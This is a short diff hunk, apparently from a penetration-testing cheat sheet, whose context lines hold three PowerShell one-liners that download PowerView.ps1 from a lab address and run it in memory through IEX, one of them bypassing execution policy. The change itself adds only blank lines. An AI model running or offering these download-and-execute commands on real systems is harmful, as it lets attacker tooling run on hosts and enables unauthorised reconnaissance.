@@ -21,3 +21,5 @@ IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1'
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1') | powershell -noprofile -
 powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.10.10/PowerView.ps1')|iex"
 ```
+
+
